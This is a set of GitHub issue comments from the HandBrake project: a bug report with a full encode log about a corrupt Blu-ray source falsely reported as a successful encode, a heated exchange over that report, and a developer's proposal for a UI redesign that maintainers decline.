HandBrake/HandBrake/1517/410419756,"And FYI, this has ZERO to do with the PHYSICAL media it is hilarious that was the first defensive knee-jerk reaction to make this go away and close it.  HB doesn't even make low-level I/O calls the failure is in the reading of the actual source file regardless of where the heck it sits.  Copy a corrupt source file, any source file to the hard drive and Handbrake simply is coded so poorly that corrupt source file that fails to read, will not properly fail the job - period.  I just tried it by hex-editing a source file to corrupt it and HB did the exact same thing.  It is fully reproducible and to simply close this issue is absolutely unbelievable. ",True,True,False,HandBrake/HandBrake/1517
HandBrake/HandBrake/1517/410421888,"I understand you're frustrated. Regardless of the issue, you're being an ass. HandBrake is open source, free software, and nobody owes you anything, despite our efforts to provide support in our free time. I'm going to leave these here and lock the issue. Please consider them and if you don't feel like changing your attitude, please go away. ",True,True,False,HandBrake/HandBrake/1517
HandBrake/HandBrake/1584/423638299,We've had this discussion before so I don't feel the need to rehash it again. We don't plan to take the UI in this direction. ,False,True,False,HandBrake/HandBrake/1584
HandBrake/HandBrake/1584/359501749,"I just finished an overhaul to the VidCoder main UI and I thought it turned out nicely. I'd like to propose bringing it to the official HandBrake UI. I think of the encoding process in three main phases 1) How. How should the file be encoded? What container do we want? What size display are we targeting? How many channels of audio do we need? Does it support anamorphic? What audio and video decoders are supported on the playback device? A user might just pick a preset, or they might go in and set it up manually. Typically you can set this up once and re use it, maybe with minor tweaks across many sources. 2) What. What sources are we encoding? Did we load the right source? Which angle do we pick, what audio and subtitle streams do we include? Do we want only audio or do we want subtitles? What are the chapters named? 3) When. When will we be done? What items are in the queue? How is the encode going? A user will go through steps 2 and 3 many times when encoding multiple files. This is the standard core workflow for transcoding video. The core workflow is here in the current HandBrake UI  Picking what you want to encode involves a journey between 3 different tabs. All of the data is mixed in with the complex ""how"" of encoding that is not relevant to the core workflow. To check what you've already queued up or to monitor the encode, you need to explicitly open a separate window. To streamline this, I put the core workflow into the main window. This allows more real estate to be devoted to helping you get through the common, routine processing steps  Load the source, then you get everything at a glance, immediately editable. If there's not enough room, the sections collapse, showing as much as possible without scrolling. Queue up items and start the encode and the progress/queue is immediately visible. Decoupling the source data and the encoding settings gives you another advantage you can edit the encoding settings without needing a source open. The source area can have an ""open"" UI on it, rather than a bunch of grayed out boxes  I do remember a few objections to this kind of approach when I first suggested it in 2010 But what if I like to tweak encoding settings for every source? That's still possible. The encoding settings window opens beside the main window and stays open on relaunching. It's not modal so it doesn't put up any roadblocks to immediate tweaking. But it doesn't make sense to edit encoding settings without a source loaded. I have not heard of any practical problems or user confusion in 8 years. The approach seems to be working well. But if people batch process, some of the files might come out wrong and people will be angry. This has never happened. People really like the batch processing. There have also been a lot of changes since the initial prototype UI. I've also heard the sentiment that HandBrake and VidCoder are two separate projects meant for different purposes. I don't think that's true at all; I believe firmly that the same software can serve all the use cases of anyone who might like either. It's just a matter of getting there. VidCoder is missing some functionality from HandBrake and has its share of issues and incompatibilities, but I don't think it's anything we can't work out. Let me know what you think. I'd be happy to help with any changes. ",False,True,False,HandBrake/HandBrake/1584
HandBrake/HandBrake/1584/423643309,"We discussed it a long time ago  When the prototype UI looked very different When the proposed UI did not have the at-a-glance accordion source view Before testing with tens of thousands of users over years revealed that Batch processing does not create user problems Editing without a source loaded does not cause user confusion   When people thought I was just some crank out of left field with a bad idea who wouldn't stick around  I think a lot has changed and it's worth another look. Given all this, why are you so adamant that the current UI is the best and only way to do things? ",False,True,False,HandBrake/HandBrake/1584
HandBrake/HandBrake/1517/347464573,"Description of the problem Encode movie with apparent bad source disc.  Handbrake encodes less than 10%, shows a green SUCCESSFUL finish in queue as shown here (last on the list)  And the end of encode log as src/libbluray/bluray.c696 Skipping broken unit at 6708854784 [040357] reader done. 1 scr changes ♠` As a test, which has only upset me more, when I run this source media through multiple other encoder/video tools that even just copy the streams, literally every one but Handbrake quickly return errors like this (MakeMKV identified source as bad within 2 min into stream RIP and gave a very clear indication there was a problem with source)  With HB the result of this reported successful encode job is ultimately a truncated 21 minute BAD video file - accompanied with two thumbs up from Handbrake.  I do not nor ever have expected Handbrake to work any magic with a bad source, but any encoder should at least know when it has failed due to having a bad source, and in such until now I thought had been properly returning the job as failed on a bad source.  My HUGE concern now is as it stands that I have to go back and hand-parse EVERY encode log and watch every video to determine if the job was truly a success because, had this one instead been a 98% complete encode, seeing ""success"" in both the GUI and looking at the end of the the log for failure (which I would never usually even do unless the job showed as failed) I would have never caught the failure and simply moved it to my library and then wondered why parts either stuttered or did not play at all or in this case, the movie just stopped prematurely.  And given this example and depending on how long this bug has been in place, I'm sure it has already occurred for me and this is going to become VERY time-consuming to hand-parse logs or re-run my media through other tools to verify source media was readable or not. Parsing this known bad encode log for the word ""errors"" renders exactly twelve lines ending in ""errors""....and all twelve have ZERO before the word errors.  I can't stress enough how big of an issue this is. With all that said, if possible to nail it down, I would be interested in knowing how long this issue has existed so I can have an idea of just how long I have to back-trace my encodes and manually review all logs to ensure I don't have not yet watched bad encodes (that HB returned as good) now sitting in my media folders.  Also, is parsing for ""skipping broken unit"" in bad HB versions the best/only way to truly determine when an otherwise successful returned job was really a failure due to bad source media?  TIA! Steps to reproduce the problem Select source Add to queue Start encode queue Encode job shows erroneously shows success HandBrake version (e.g., 1.0.0) 20180729125104-ecf8523-master (2018073001) Operating system and version (e.g., Ubuntu 16.04 LTS, macOS 10.3 High Sierra, Windows 10 Creators Update) Win7x64 Error message text or screenshot Last job on the list is job in question showing as successful completion  HandBrake Activity Log required (see  Nightly 20180729125104-ecf8523-master (2018073001) OS Microsoft Windows NT 6.1.7601 Service Pack 1 Ram 16366 MB,  GPU Information   AMD Radeon HD 7470 - 8.922.0.0   AMD Radeon HD 7470 - 8.922.0.0 Screen 1920x1080 Temp Dir C\Temp\ Install Dir C\Program Files\HandBrake Nightly Data Dir C\Users\Encoder\AppData\Roaming\HandBrake\Nightly  -------------------------------------------   # Starting Encode ...  [025628] hb_init starting libhb thread [025628] 1 job(s) to process [025628] json job {   ""Audio"" {     ""AudioList"" [       {         ""DRC"" 0.0,         ""Encoder"" ""copy"",         ""Gain"" 0.0,         ""Mixdown"" -1,         ""NormalizeMixLevel"" false,         ""Samplerate"" 48000,         ""Track"" 0,         ""DitherMethod"" 0       },       {         ""DRC"" 0.0,         ""Encoder"" ""copy"",         ""Gain"" 0.0,         ""Mixdown"" -1,         ""NormalizeMixLevel"" false,         ""Samplerate"" 48000,         ""Track"" 1,         ""DitherMethod"" 0       },       {         ""DRC"" 0.0,         ""Encoder"" ""copy"",         ""Gain"" 0.0,         ""Mixdown"" -1,         ""NormalizeMixLevel"" false,         ""Samplerate"" 48000,         ""Track"" 4,         ""DitherMethod"" 0       }     ],     ""CopyMask"" [       ""copyac3"",       ""copydtshd"",       ""copydts"",       ""copytruehd""     ],     ""FallbackEncoder"" ""ac3""   },   ""Destination"" {     ""ChapterList"" [       {         ""Name"" ""Chapter 1""       },       {         ""Name"" ""Chapter 2""       },       {         ""Name"" ""Chapter 3""       },       {         ""Name"" ""Chapter 4""       },       {         ""Name"" ""Chapter 5""       },       {         ""Name"" ""Chapter 6""       },       {         ""Name"" ""Chapter 7""       },       {         ""Name"" ""Chapter 8""       },       {         ""Name"" ""Chapter 9""       },       {         ""Name"" ""Chapter 10""       },       {         ""Name"" ""Chapter 11""       },       {         ""Name"" ""Chapter 12""       },       {         ""Name"" ""Chapter 13""       },       {         ""Name"" ""Chapter 14""       },       {         ""Name"" ""Chapter 15""       },       {         ""Name"" ""Chapter 16""       }     ],     ""ChapterMarkers"" true,     ""AlignAVStart"" false,     ""File"" ""J\\RIP\\MKV\\Startrek 11.mkv"",     ""Mp4Options"" {       ""IpodAtom"" false,       ""Mp4Optimize"" false     },     ""Mux"" ""mkv""   },   ""Filters"" {     ""FilterList"" [       {         ""ID"" 2,         ""Settings"" {}       },       {         ""ID"" 4,         ""Settings"" {           ""mode"" ""7""         }       },       {         ""ID"" 11,         ""Settings"" {           ""crop-bottom"" ""140"",           ""crop-left"" ""0"",           ""crop-right"" ""0"",           ""crop-top"" ""140"",           ""height"" ""800"",           ""width"" ""1920""         }       },       {         ""ID"" 6,         ""Settings"" {           ""mode"" ""1""         }       }     ]   },   ""PAR"" {     ""Num"" 1,     ""Den"" 1   },   ""Metadata"" {},   ""SequenceID"" 0,   ""Source"" {     ""Angle"" 1,     ""Range"" {       ""Type"" ""chapter"",       ""Start"" 1,       ""End"" 16     },     ""Title"" 1,     ""Path"" ""U\\""   },   ""Subtitle"" {     ""Search"" {       ""Burn"" false,       ""Default"" true,       ""Enable"" true,       ""Forced"" true     },     ""SubtitleList"" [       {         ""Burn"" false,         ""Default"" false,         ""Forced"" false,         ""ID"" 1,         ""Offset"" 0,         ""Track"" 0       },       {         ""Burn"" false,         ""Default"" false,         ""Forced"" false,         ""ID"" 2,         ""Offset"" 0,         ""Track"" 1       }     ]   },   ""Video"" {     ""Encoder"" ""x264"",     ""Bitrate"" 10000,     ""TwoPass"" true,     ""Turbo"" true,     ""ColorMatrixCode"" 0,     ""Options"" ""weightb=1open-gop=0scenecut=40rc-lookahead=60chroma-me=1fast-pskip=0nr=0bluray-compat=0constrained-intra=0b-bias=0intra-refresh=0ref=4bframes=8b-adapt=2direct=autome=umhsubme=9merange=24analyse=allno-dct-decimate=1deblock=-1,-1"",     ""QSV"" {       ""Decode"" true,       ""AsyncDepth"" 0     }   } } [025628] CPU Intel(R) Core(TM) i7-3770 CPU @ 3.40GHz [025628]  - Intel microarchitecture Ivy Bridge [025628]  - logical processor count 8 [025628] Intel Quick Sync Video support yes [025628]  - Intel Media SDK software API 1.23 (minimum 1.3) [025628]  - H.264 encoder yes [025628]     - preferred implementation software (null) [025628]     - capabilities (software)  bpyramid vsinfo opt1 opt2 [025628]  - H.265 encoder no [025628] hb_scan path=U\, title_index=1 src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar [025628] scan BD has 19 title(s) [025628] bd scanning title 1 [025628] bd playlist 00000.MPLS [025628] bd duration is 020650 (7610269 ms) [025628] bd video id=0x1011, stream type=H.264, format 1080p [025628] bd aspect = 169 [025628] bd audio id=0x761100, lang=English (AC3), 3cc=eng [025628] bd audio id=0x721100, lang=English (TrueHD), 3cc=eng [025628] bd audio id=0x1101, lang=Francais (AC3), 3cc=fra [025628] bd audio id=0x1102, lang=español (AC3), 3cc=spa [025628] bd audio id=0x1103, lang=English (AC3), 3cc=eng [025628] bd subtitle id=0x1200, lang=English [PGS], 3cc=eng [025628] bd subtitle id=0x1201, lang=English [PGS], 3cc=eng [025628] bd subtitle id=0x1202, lang=Francais [PGS], 3cc=fra [025628] bd subtitle id=0x1203, lang=español [PGS], 3cc=spa [025628] bd subtitle id=0x1204, lang=Portugues [PGS], 3cc=por [025628] bd subtitle id=0x1205, lang=Francais [PGS], 3cc=fra [025628] bd subtitle id=0x1206, lang=español [PGS], 3cc=spa [025628] bd chap 1 packet=768, 717216 ms [025628] bd chap 2 packet=3734035584, 467884 ms [025628] bd chap 3 packet=6214336896, 504003 ms [025628] bd chap 4 packet=8885081472, 444402 ms [025628] bd chap 5 packet=11234502336, 516891 ms [025628] bd chap 6 packet=13994168448, 491324 ms [025628] bd chap 7 packet=16621220352, 551884 ms [025628] bd chap 8 packet=19544962368, 606480 ms [025628] bd chap 9 packet=22751003520, 539413 ms [025628] bd chap 10 packet=25570130112, 415790 ms [025628] bd chap 11 packet=27759434880, 534283 ms [025628] bd chap 12 packet=30594421440, 484692 ms [025628] bd chap 13 packet=33140312448, 519143 ms [025628] bd chap 14 packet=35858720256, 307140 ms [025628] bd chap 15 packet=37505899392, 509467 ms [025628] bd chap 16 packet=39567801216, 250 ms [025628] bd title 1 has 16 chapters [025628] scan decoding previews for title 1 [025628] scan title angle(s) 1 [025628] scan audio 0x721100 truehd, rate=48000Hz, bitrate=128000 English (TrueHD) (5.1 ch) [025628] scan audio 0x1103 ac3, rate=48000Hz, bitrate=224000 English (AC3) (2.0 ch) [025628] scan audio 0x761100 ac3, rate=48000Hz, bitrate=640000 English (AC3) (5.1 ch) [025628] scan audio 0x1101 ac3, rate=48000Hz, bitrate=640000 Francais (AC3) (5.1 ch) [025628] scan audio 0x1102 ac3, rate=48000Hz, bitrate=640000 español (AC3) (5.1 ch) [025630] scan 10 previews, 1920x1080, 23.976 fps, autocrop = 140/140/0/0, aspect 169, PAR 11 [025630] scan supported video decoders avcodec qsv [025630] stream 10 good frames, 0 errors (0%) [025630] libhb scan thread found 1 valid title(s) [025630] starting job [025630] yadif thread started for segment 0 [025630] yadif thread started for segment 1 [025630] yadif thread started for segment 3 [025630] yadif thread started for segment 2 [025630] yadif thread started for segment 4 [025630] yadif thread started for segment 5 [025630] yadif thread started for segment 6 [025630] yadif thread started for segment 7 [025630] job configuration [025630]  * source [025630]    + U\ [025630]    + title 1, chapter(s) 1 to 16 [025630]  * destination [025630]    + J\RIP\MKV\Startrek 11.mkv [025630]    + container Matroska (libavformat) [025630]      + chapter markers [025630]  * video track [025630]    + decoder h264_qsv [025630]      + bitrate 200 kbps [025630]    + filters [025630]      + Detelecine (pullup) () [025630]      + Decomb (mode=7) [025630]      + Framerate Shaper (mode=1) [025630]        + frame rate 23.976 fps -&gt; constant 23.976 fps [025630]      + Crop and Scale (width=1920height=800crop-top=140crop-bottom=140crop-left=0crop-right=0) [025630]        + source 1920 * 1080, crop (140/140/0/0) 1920 * 800, scale 1920 * 800 [025630]    + Output geometry [025630]      + storage dimensions 1920 x 800 [025630]      + pixel aspect ratio 1  1 [025630]      + display dimensions 1920 x 800 [025630]  * Foreign Audio Search Passthrough, Forced Only, Default [025630]    + subtitle, English [PGS] (track 0, id 0x1200, Picture) [025630]    + subtitle, English [PGS] (track 1, id 0x1201, Picture) src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar [025630] sync expecting 182464 video frames src/libbluray/bluray.c696 Skipping broken unit at 6708854784 [025820] reader done. 1 scr changes [025820] work average encoding speed for job is 0.000000 fps [025820] decomb deinterlaced 0 | blended 0 | unfiltered 0 | total 0 [025820] vfr 0 frames output, 0 dropped and 0 duped for CFR/PFR [025820] vfr lost time 0 (0 frames) [025820] vfr gained time 0 (0 frames) (0 not accounted for) [025820] stream 30674 good frames, 0 errors (0%) [025820] sync got 0 frames, 182464 expected [025820] Subtitle track 0 (id 0x1200) 'English [PGS]' 206 hits (0 forced) [025820] Subtitle track 1 (id 0x1201) 'English [PGS]' 268 hits (0 forced) [025820] No candidate detected during subtitle scan [025820] starting job [025820] yadif thread started for segment 0 [025820] yadif thread started for segment 1 [025820] yadif thread started for segment 2 [025820] yadif thread started for segment 3 [025820] yadif thread started for segment 4 [025820] yadif thread started for segment 5 [025820] yadif thread started for segment 6 [025820] yadif thread started for segment 7 [025820] Auto Passthru allowed codecs are AC3, TrueHD, DTS, DTS-HD [025820] Auto Passthru fallback is AC3 [025820] Auto Passthru using AC3 Passthru for track 1 [025820] Auto Passthru using TrueHD Passthru for track 2 [025820] Auto Passthru using AC3 Passthru for track 3 [025820] job configuration [025820]  * source [025820]    + U\ [025820]    + title 1, chapter(s) 1 to 16 [025820]  * destination [025820]    + J\RIP\MKV\Startrek 11.mkv [025820]    + container Matroska (libavformat) [025820]      + chapter markers [025820]  * video track [025820]    + decoder h264_qsv [025820]      + bitrate 200 kbps [025820]    + filters [025820]      + Detelecine (pullup) () [025820]      + Decomb (mode=7) [025820]      + Framerate Shaper (mode=1) [025820]        + frame rate 23.976 fps -&gt; constant 23.976 fps [025820]      + Crop and Scale (width=1920height=800crop-top=140crop-bottom=140crop-left=0crop-right=0) [025820]        + source 1920 * 1080, crop (140/140/0/0) 1920 * 800, scale 1920 * 800 [025820]    + Output geometry [025820]      + storage dimensions 1920 x 800 [025820]      + pixel aspect ratio 1  1 [025820]      + display dimensions 1920 x 800 [025820]    + encoder H.264 (libx264) [025820]      + options weightb=1open-gop=0scenecut=40rc-lookahead=60chroma-me=1fast-pskip=0nr=0bluray-compat=0constrained-intra=0b-bias=0intra-refresh=0ref=4bframes=8b-adapt=2direct=autome=umhsubme=9merange=24analyse=allno-dct-decimate=1deblock=-1,-1 [025820]      + bitrate 10000 kbps, pass 1 [025820]      + fast first pass [025820]      + options ref=18x8dct=0me=diatrellis=0 [025820]                 analyse=i4x4 (if originally enabled, else analyse=none) [025820]                 subq=2 (if originally greater than 2, else subq unchanged) [025820]  * subtitle track 1, English [PGS] (track 0, id 0x1200, Picture) -&gt; Passthrough [025820]  * subtitle track 2, English [PGS] (track 1, id 0x1201, Picture) -&gt; Passthrough [025820]  * audio track 1 [025820]    + decoder English (AC3) (5.1 ch) (track 1, id 0x761100) [025820]      + bitrate 640 kbps, samplerate 48000 Hz [025820]    + AC3 Passthru [025820]  * audio track 2 [025820]    + decoder English (TrueHD) (5.1 ch) (track 2, id 0x721100) [025820]      + bitrate 128 kbps, samplerate 48000 Hz [025820]    + TrueHD Passthru [025820]  * audio track 3 [025820]    + decoder English (AC3) (2.0 ch) (track 5, id 0x1103) [025820]      + bitrate 224 kbps, samplerate 48000 Hz [025820]    + AC3 Passthru src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar [025820] sync expecting 182464 video frames [025820] encx264 min-keyint 24, keyint 240 [025820] encx264 encoding at average bitrate 10000 [025820] encx264 unparsed options open-gop=0rc-lookahead=60chroma-me=1fast-pskip=0nr=0bluray-compat=0constrained-intra=0b-bias=0intra-refresh=0ref=4bframes=8b-adapt=2direct=autome=umhsubme=9merange=24analyse=alldeblock=-1,-1dct-decimate=0 x264 [info] using SAR=1/1 x264 [info] using cpu capabilities MMX2 SSE2Fast SSSE3 SSE4.2 AVX x264 [info] profile Main, level 4.0 [025820] sync first pts audio 0x721100 is 0 [025821] sync first pts audio 0x1103 is 0 [025821] sync first pts video is 0 [025821] sync ""Chapter 1"" (1) at frame 1 time 0 [025821] sync first pts audio 0x761100 is 0 [025905] sync first pts subtitle 0x1201 is 5551796 [025922] sync first pts subtitle 0x1200 is 7105848 [030934] sync ""Chapter 2"" (2) at frame 17197 time 64549485 [031651] sync ""Chapter 3"" (3) at frame 28415 time 106659052 src/libbluray/bluray.c696 Skipping broken unit at 6708854784 [031819] reader done. 1 scr changes [031822] work average encoding speed for job is 25.551609 fps [031822] decomb deinterlaced 30672 | blended 0 | unfiltered 0 | total 30672 [031822] vfr 30674 frames output, 0 dropped and 2 duped for CFR/PFR [031822] vfr lost time 3754 (0 frames) [031822] vfr gained time 3754 (4 frames) (0 not accounted for) [031822] stream 30674 good frames, 0 errors (0%) [031822] ac3-decoder done 39958 frames, 0 decoder errors [031822] truehd-decoder done 1534426 frames, 0 decoder errors [031822] ac3-decoder done 39971 frames, 0 decoder errors [031822] h264_qsv-decoder done 30673 frames, 0 decoder errors [031823] sync got 30673 frames, 182464 expected [031823] sync framerate min 7.992 fps, max 23.981 fps, avg 23.974 fps x264 [info] frame I177   Avg QP15.69  size159915 x264 [info] frame P9051  Avg QP19.52  size 71527 x264 [info] frame B21446 Avg QP19.58  size 42785 x264 [info] consecutive B-frames  8.6%  7.9% 15.9% 11.0% 12.0% 35.7%  4.2%  1.8%  2.8% x264 [info] mb I  I16..4 42.6%  0.0% 57.4% x264 [info] mb P  I16..4 69.8%  0.0%  0.0%  P16..4 26.6%  0.0%  0.0%  0.0%  0.0%    skip 3.5% x264 [info] mb B  I16..4 26.5%  0.0%  0.0%  B16..8 29.0%  0.0%  0.0%  direct23.1%  skip21.4%  L037.4% L137.5% BI25.1% x264 [info] final ratefactor 18.48 x264 [info] direct mvs  spatial99.7% temporal0.3% x264 [info] coded y,uvDC,uvAC intra 82.2% 62.0% 33.5% inter 36.7% 28.6% 5.0% x264 [info] i16 v,h,dc,p 20% 17% 41% 22% x264 [info] i4 v,h,dc,ddl,ddr,vr,hd,vl,hu 17% 17% 17%  9%  9%  8%  8%  8%  7% x264 [info] i8c dc,h,v,p 56% 19% 19%  6% x264 [info] Weighted P-Frames Y6.1% UV4.6% x264 [info] kb/s9962.88 [031823] starting job [031823] yadif thread started for segment 0 [031823] yadif thread started for segment 1 [031823] yadif thread started for segment 2 [031823] yadif thread started for segment 3 [031823] yadif thread started for segment 4 [031823] yadif thread started for segment 5 [031823] yadif thread started for segment 6 [031823] yadif thread started for segment 7 [031823] Auto Passthru allowed codecs are AC3, TrueHD, DTS, DTS-HD [031823] Auto Passthru fallback is AC3 [031823] Auto Passthru using AC3 Passthru for track 1 [031823] Auto Passthru using TrueHD Passthru for track 2 [031823] Auto Passthru using AC3 Passthru for track 3 [031823] job configuration [031823]  * source [031823]    + U\ [031823]    + title 1, chapter(s) 1 to 16 [031823]  * destination [031823]    + J\RIP\MKV\Startrek 11.mkv [031823]    + container Matroska (libavformat) [031823]      + chapter markers [031823]  * video track [031823]    + decoder h264_qsv [031823]      + bitrate 200 kbps [031823]    + filters [031823]      + Detelecine (pullup) () [031823]      + Decomb (mode=7) [031823]      + Framerate Shaper (mode=1) [031823]        + frame rate 23.976 fps -&gt; constant 23.976 fps [031823]      + Crop and Scale (width=1920height=800crop-top=140crop-bottom=140crop-left=0crop-right=0) [031823]        + source 1920 * 1080, crop (140/140/0/0) 1920 * 800, scale 1920 * 800 [031823]    + Output geometry [031823]      + storage dimensions 1920 x 800 [031823]      + pixel aspect ratio 1  1 [031823]      + display dimensions 1920 x 800 [031823]    + encoder H.264 (libx264) [031823]      + options weightb=1open-gop=0scenecut=40rc-lookahead=60chroma-me=1fast-pskip=0nr=0bluray-compat=0constrained-intra=0b-bias=0intra-refresh=0ref=4bframes=8b-adapt=2direct=autome=umhsubme=9merange=24analyse=allno-dct-decimate=1deblock=-1,-1 [031823]      + bitrate 10000 kbps, pass 2 [031823]  * subtitle track 1, English [PGS] (track 0, id 0x1200, Picture) -&gt; Passthrough [031823]  * subtitle track 2, English [PGS] (track 1, id 0x1201, Picture) -&gt; Passthrough [031823]  * audio track 1 [031823]    + decoder English (AC3) (5.1 ch) (track 1, id 0x761100) [031823]      + bitrate 640 kbps, samplerate 48000 Hz [031823]    + AC3 Passthru [031823]  * audio track 2 [031823]    + decoder English (TrueHD) (5.1 ch) (track 2, id 0x721100) [031823]      + bitrate 128 kbps, samplerate 48000 Hz [031823]    + TrueHD Passthru [031823]  * audio track 3 [031823]    + decoder English (AC3) (2.0 ch) (track 5, id 0x1103) [031823]      + bitrate 224 kbps, samplerate 48000 Hz [031823]    + AC3 Passthru src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar [031823] sync expecting 30673 video frames [031823] encx264 min-keyint 24, keyint 240 [031823] encx264 encoding at average bitrate 10000 [031823] encx264 unparsed options open-gop=0rc-lookahead=60chroma-me=1fast-pskip=0nr=0bluray-compat=0constrained-intra=0b-bias=0intra-refresh=0ref=4bframes=8b-adapt=2direct=autome=umhsubme=9merange=24analyse=alldeblock=-1,-1dct-decimate=0 x264 [info] using SAR=1/1 x264 [info] using cpu capabilities MMX2 SSE2Fast SSSE3 SSE4.2 AVX x264 [info] profile High, level 4.0 [031823] sync first pts audio 0x721100 is 0 [031824] sync first pts audio 0x1103 is 0 [031824] sync first pts audio 0x761100 is 0 [031824] sync first pts video is 0 [031824] sync ""Chapter 1"" (1) at frame 1 time 0 [031942] sync first pts subtitle 0x1201 is 5551796 [032022] sync first pts subtitle 0x1200 is 7105848 [034415] sync ""Chapter 2"" (2) at frame 17197 time 64549485 [040046] sync ""Chapter 3"" (3) at frame 28415 time 106659052 src/libbluray/bluray.c696 Skipping broken unit at 6708854784 [040357] reader done. 1 scr changes [040407] work average encoding speed for job is 11.197354 fps [040407] decomb deinterlaced 30672 | blended 0 | unfiltered 0 | total 30672 [040407] vfr 30674 frames output, 0 dropped and 2 duped for CFR/PFR [040407] vfr lost time 3754 (0 frames) [040407] vfr gained time 3754 (4 frames) (0 not accounted for) [040407] stream 30674 good frames, 0 errors (0%) [040407] ac3-decoder done 39958 frames, 0 decoder errors [040407] truehd-decoder done 1534426 frames, 0 decoder errors [040407] ac3-decoder done 39971 frames, 0 decoder errors [040407] h264_qsv-decoder done 30673 frames, 0 decoder errors [040407] sync got 30673 frames, 30673 expected [040407] sync framerate min 7.992 fps, max 23.981 fps, avg 23.974 fps x264 [info] frame I177   Avg QP17.15  size145081 x264 [info] frame P9051  Avg QP19.89  size 73396 x264 [info] frame B21446 Avg QP20.33  size 42385 x264 [info] consecutive B-frames  8.6%  7.9% 15.9% 11.0% 12.0% 35.7%  4.2%  1.8%  2.8% x264 [info] mb I  I16..4 14.2% 69.1% 16.7% x264 [info] mb P  I16..4  6.0% 29.3%  4.2%  P16..4 37.5% 13.3%  6.3%  0.2%  0.0%    skip 3.3% x264 [info] mb B  I16..4  1.0%  4.5%  0.6%  B16..8 44.1% 11.6%  2.7%  direct10.5%  skip25.0%  L048.2% L146.2% BI 5.6% x264 [info] 8x8 transform intra74.0% inter59.2% x264 [info] direct mvs  spatial98.3% temporal1.7% x264 [info] coded y,uvDC,uvAC intra 86.1% 79.6% 52.9% inter 46.5% 43.0% 10.5% x264 [info] i16 v,h,dc,p 18% 21% 19% 41% x264 [info] i8 v,h,dc,ddl,ddr,vr,hd,vl,hu  6%  6%  5% 12% 17% 14% 16% 11% 12% x264 [info] i4 v,h,dc,ddl,ddr,vr,hd,vl,hu  5%  6%  2% 12% 17% 15% 18% 12% 14% x264 [info] i8c dc,h,v,p 44% 23% 16% 17% x264 [info] Weighted P-Frames Y6.1% UV4.6% x264 [info] ref P L0 53.8% 10.5% 22.0% 12.0%  1.7%  0.1% x264 [info] ref B L0 80.8% 16.1%  3.1% x264 [info] ref B L1 92.3%  7.7% x264 [info] kb/s9998.64 [040407] mux track 0, 30674 frames, 1598977795 bytes, 9998.60 kbps, fifo 512 [040407] mux track 1, 39958 frames, 102292480 bytes, 639.65 kbps, fifo 512 [040407] mux track 2, 1534426 frames, 578997900 bytes, 3620.54 kbps, fifo 32768 [040407] mux track 3, 39971 frames, 35814016 bytes, 223.95 kbps, fifo 512 [040407] mux track 4, 411 frames, 5277905 bytes, 33.00 kbps, fifo 16 [040407] mux track 5, 535 frames, 6521743 bytes, 40.78 kbps, fifo 32 [040407] libhb work result = 0  # Encode Completed ...  ",False,True,False,HandBrake/HandBrake/1517
HandBrake/HandBrake/1584/423729686,"Wait... what changed? 🤣 Seriously though, I don't think this is an issue of ""best"". There are often multiple ways to approach things, and yours may be fine for your user base. It simply isn't a direction we want to take the HandBrake UI. The main comments I would like to make pertain to your premise and the core workflow. The how/what/when idiom again may make sense for you and your users. This is vastly different from how we approach the HandBrake UI. Our core workflow has evolved over the years, and while I'm not one to take a ton of credit, I have been investing quite a bit of thought and design into improving stress areas over time while accommodating new objectives and the features that support them. We've approached things from a realignment perspective (iterative improvements), rather than a complete redesign, and there are more improvements in the pipeline that wouldn't be easily accommodated by your design. Consider for example the proposed dimensions overhaul and plethora of color space/depth related updates we will need to implement before long. Video filters are also more popular than people realize, and more are planned along with better presentation thereof as I/we have time. The current core workflow is probably best explained by the Quick start article. In short, open a source, select a preset, hit start. That mostly leaves ""where did it go?"" and we've improved the destination controls and documentation to help with that, too. The result is that normal humans are more able to successfully use HandBrake now than ever before. I talk to regular people using HandBrake all the time (both in passing and for research purposes) and their experiences support this. So does my stopwatch. The rest of the UI is then what the presets system sets on behalf of the user. While these tabs/controls could be hidden completely (ala Instant HandBrake of years past), they provide no obstacle these days. We've disabled most unnecessary controls on startup and presented the summary tab as an excellent at-a-glance description of what will happen. The team has worked to achieve a hybrid beginner/pro UI design that only reveals more as you desire to go deeper, and I'm very proud of that. So we've solved very specific sticking points for millions of people with the current iteration. I and others continue to do research and design to iteratively improve the existing flow. Your design addresses a completely different set of concerns, so in some ways, we're comparing apples to oranges. While some comparisons can be made, there is no ""best"". The HandBrake UI is on a proven, successful path, and yours is a departure from that path. I don't believe it addresses many of the issues we had, currently have, and plan to improve. If it works for VidCoder, great! I have no doubt this is a useful paradigm for some people. That HandBrake is going a different direction hopefully will not discourage you from continuing to iterate and improve for your audience. ",False,True,False,HandBrake/HandBrake/1584
HandBrake/HandBrake/1584/423746463,"I'm not saying your UI is bad, or that you haven't been improving it, or that people can't get things done or figure out what to do. I'm just saying I think it can be changed so people need to click fewer times and look fewer places to get things done. What makes you certain that any additional changes are necessarily bad? Please try to look at it objectively and not as an attack on anybody or any work that's been done. As for the dimensions overhaul, I've already done it. And anyway that particular UI is not something that's hard to do with the proposed UI. It's just contained in the encoding settings window.  Which, by the way 1) Opens not as a dialog but as a helper window. So it does not force the user to close it to interact with anything else in the UI. 2) Is brought into view any time the user is working with any window in the app. 3) Opens beside the main window if the user has space. 4) Remembers its open state and position. So all that that sizing and filters UI is just as readily accessible as before. Why do you think the sizing or filters changes are not possible with this proposal? I'm just asking you to seriously consider an alternate. How it it solving ""different"" concerns? What concern do you think I am addressing, exactly, and why is that concern invalid? Where did this deep conviction come from that there are two fundamentally different user bases, and that the same UI can't possibly 